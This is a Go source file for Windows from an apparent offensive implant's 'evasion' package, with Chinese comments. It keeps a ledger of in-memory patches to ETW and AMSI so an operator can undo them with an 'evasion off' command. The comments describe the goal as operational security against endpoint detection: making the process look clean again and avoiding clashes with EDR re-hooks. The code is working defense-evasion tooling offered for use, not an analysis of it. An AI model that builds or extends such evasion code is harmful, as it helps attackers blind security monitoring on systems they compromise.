//go:build windows

package evasion

import (
	"errors"
	"fmt"
	"sync"
	"unsafe"
)

// ===== 启动期能力撤销（OPSEC 阶段四）=====
//
// 问题：原来的 PatchETW / PatchAMSI 只写内存、**不保存原始字节**，所以
// `evasion off` 这类"撤销"操作无法实现 —— 打了补丁就再也回不去。
// 这既是运维问题也是 OPSEC 问题：补丁是**持久的进程内修改**，
// 一旦某次操作需要恢复被 hook 的真实实现（或者需要让进程重新"看起来干净"），
// 没有原始字节就只能重启进程。
//
// 这里维护一份 patch 台账：每次成功写入前先把原字节读出来存下，
// 撤销时按**逆序**写回（后打的先撤，避免同一地址被多次 patch 时顺序错乱）。
//
// 边界（写清，避免被当成万能回滚）：
//   - 只能撤销**本进程内、经本台账**打过的补丁。重启后台账为空。
//   - 若补丁期间目标代码被其它方再次修改（EDR 重新 hook、hotpatch），
//     撤销会写入旧字节，可能与当前状态不一致；写入前会比对当前字节是否为
//     我们自己写的补丁，不一致就跳过并报告（不盲目覆盖）。

// patchRecord 一次 patch 的台账条目
type patchRecord struct {
	// Tag 能力标签（etw / amsi …）：`evasion off <能力>` 要按能力精确撤销，
	// 不能把 ETW 和 AMSI 的补丁一起抹掉。
	Tag      string
	Module   string
	Name     string
	Addr     uintptr
	Original []byte
	Patched  []byte
}

var (
	patchMu      sync.Mutex
	patchRecords []patchRecord

	// 内存读写抽象：默认走真实进程内存；测试里可替换。
	readMemory  = defaultReadMemory
	writeMemory = defaultWriteMemory
)

// defaultReadMemory 读进程内存 n 字节
func defaultReadMemory(addr uintptr, n int) []byte {
	if addr == 0 || n <= 0 {
		return nil
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(addr)), n)
	out := make([]byte, n)
	copy(out, src)
	return out
}

// defaultWriteMemory 用 patchBytes 的语义写进程内存（含 VirtualProtect）
func defaultWriteMemory(addr uintptr, data []byte) error {
	return patchBytes(addr, data)
}

// recordPatch 记账一次成功 patch。同一地址重复 patch 时保留**最早**的原始字节，
// 否则第二次 patch 的"原始字节"会是第一次的补丁 —— 撤销时就还原不回真实实现。
func recordPatch(tag, module, name string, addr uintptr, original, patched []byte) {
	patchMu.Lock()
	defer patchMu.Unlock()

	for i := range patchRecords {
		if patchRecords[i].Addr == addr {
			// 已记过：只更新补丁内容，原始字节保持最早那份
			patchRecords[i].Patched = append([]byte(nil), patched...)
			return
		}
	}
	patchRecords = append(patchRecords, patchRecord{
		Tag:      tag,
		Module:   module,
		Name:     name,
		Addr:     addr,
		Original: append([]byte(nil), original...),
		Patched:  append([]byte(nil), patched...),
	})
}

// 能力标签：与 config.EvasionKey 对应，供 `evasion off <能力>` 精确撤销
const (
	TagETW  = "etw"
	TagAMSI = "amsi"
)

// RestoreReport 撤销结果
type RestoreReport struct {
	Targets []RestoreTarget
}

// RestoreTarget 单个目标的撤销结果
type RestoreTarget struct {
	Module string
	Name   string
	Addr   uintptr
	// Restored 是否成功写回原始字节
	Restored bool
	// Skipped 是否因"当前字节不是我们写的补丁"而跳过
	Skipped bool
	Err     error
}

func (t RestoreTarget) String() string {
	switch {
	case t.Err != nil:
		return fmt.Sprintf("⚠️ %s!%s @ 0x%x: %v", t.Module, t.Name, t.Addr, t.Err)
	case t.Skipped:
		return fmt.Sprintf("⏭️ %s!%s @ 0x%x: 当前字节不是本台账写入的补丁，跳过",
			t.Module, t.Name, t.Addr)
	case t.Restored:
		return fmt.Sprintf("✅ %s!%s @ 0x%x: 已还原", t.Module, t.Name, t.Addr)
	default:
		return fmt.Sprintf("⚠️ %s!%s @ 0x%x: 未还原", t.Module, t.Name, t.Addr)
	}
}

// Restored 返回成功还原的数量
func (r RestoreReport) Restored() int {
	n := 0
	for _, t := range r.Targets {
		if t.Restored {
			n++
		}
	}
	return n
}

// Skipped 返回被跳过的数量
func (r RestoreReport) Skipped() int {
	n := 0
	for _, t := range r.Targets {
		if t.Skipped {
			n++
		}
	}
	return n
}

// ErrNoPatches 台账为空（没有可撤销的补丁）
var ErrNoPatches = errors.New("没有记录到任何已打补丁（可能是重启后，或从未 patch）")

// RestorePatches 按逆序把所有经台账记录的补丁还原为原始字节。
//
// 逆序的原因：同一段代码可能被先后 patch 两次（例如先 ETW 再 AMSI 命中了
// 重叠区域），后写的覆盖先写的；撤销只有逆序才能回到最初状态。
func RestorePatches() (RestoreReport, error) {
	return restorePatches("")
}

// RestorePatchesByTag 只撤销指定能力（etw / amsi）打的补丁。
//
// 按能力精确撤销的意义：`evasion off etw` 只该撤 ETW，不能顺手把 AMSI
// 也撤了 —— 那会让"关掉一项"变成"关掉一组"，运维完全预期不到。
func RestorePatchesByTag(tag string) (RestoreReport, error) {
	return restorePatches(tag)
}

// restorePatches tag 为空表示撤销全部
func restorePatches(tag string) (RestoreReport, error) {
	patchMu.Lock()
	records := make([]patchRecord, 0, len(patchRecords))
	for _, rec := range patchRecords {
		if tag == "" || rec.Tag == tag {
			records = append(records, rec)
		}
	}
	patchMu.Unlock()

	if len(records) == 0 {
		return RestoreReport{}, ErrNoPatches
	}

	rep := RestoreReport{}
	for i := len(records) - 1; i >= 0; i-- {
		rec := records[i]
		t := RestoreTarget{Module: rec.Module, Name: rec.Name, Addr: rec.Addr}

		// 原始字节不完整（当初读失败，或与补丁长度不符）时不具备还原条件。
		// 这一条必须先判：否则"写回空切片"会变成一次成功的空操作，
		// 报告里显示"已还原"而实际内存里还是补丁 —— 比直接报错更危险。
		if len(rec.Original) == 0 || len(rec.Original) != len(rec.Patched) {
			t.Skipped = true
			rep.Targets = append(rep.Targets, t)
			continue
		}

		// 先确认当前字节仍是"我们写的那份"：不是的话说明有人改过，
		// 盲目写回旧字节可能破坏当前状态（例如把 EDR 的新 hook 也一起抹掉）
		cur := readMemory(rec.Addr, len(rec.Patched))
		if len(cur) != len(rec.Patched) || !bytesEqual(cur, rec.Patched) {
			t.Skipped = true
			rep.Targets = append(rep.Targets, t)
			continue
		}
		if err := writeMemory(rec.Addr, rec.Original); err != nil {
			t.Err = err
			rep.Targets = append(rep.Targets, t)
			continue
		}
		t.Restored = true
		rep.Targets = append(rep.Targets, t)
	}

	// 成功还原的条目从台账移除；被跳过/失败的保留，便于重试与排查
	patchMu.Lock()
	kept := patchRecords[:0]
	restoredAddrs := make(map[uintptr]bool, len(rep.Targets))
	for _, t := range rep.Targets {
		if t.Restored {
			restoredAddrs[t.Addr] = true
		}
	}
	for _, rec := range patchRecords {
		if restoredAddrs[rec.Addr] {
			continue
		}
		kept = append(kept, rec)
	}
	patchRecords = kept
	patchMu.Unlock()

	return rep, nil
}

// PatchedCount 当前台账里记录了几个目标（供命令输出与测试用）
func PatchedCount() int {
	patchMu.Lock()
	defer patchMu.Unlock()
	return len(patchRecords)
}

// ResetPatchRegistry 清空台账（仅供测试）
func ResetPatchRegistry() {
	patchMu.Lock()
	defer patchMu.Unlock()
	patchRecords = nil
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
